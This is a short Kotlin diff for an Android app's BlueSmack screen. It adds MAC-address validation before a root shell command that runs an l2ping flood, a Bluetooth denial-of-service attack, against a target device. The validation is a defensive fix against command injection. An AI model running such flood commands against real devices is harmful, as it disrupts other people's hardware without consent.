@@ -8,6 +8,7 @@ import androidx.lifecycle.viewModelScope
 import com.hereliesaz.blusnu.data.ActionLogger
 import com.hereliesaz.blusnu.data.DeviceRepository
 import com.hereliesaz.blusnu.data.TargetDevice
+import com.hereliesaz.blusnu.utils.MacValidator
 import com.hereliesaz.blusnu.utils.RootExecutor
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.flow.MutableStateFlow
@@ -58,6 +59,7 @@ class BlueSmackViewModel(application: Application, deviceRepository: DeviceRepos
 
         viewModelScope.launch {
             _status.value = "Running l2ping flood against ${device.address}... (requires root)"
+            MacValidator.requireValid(device.address)
             val command = "l2ping -i hci0 -s 600 -f ${device.address}"
             val result = RootExecutor.execute(command)
             _status.value = if (result.isBlank()) "Attack finished." else result.take(200)
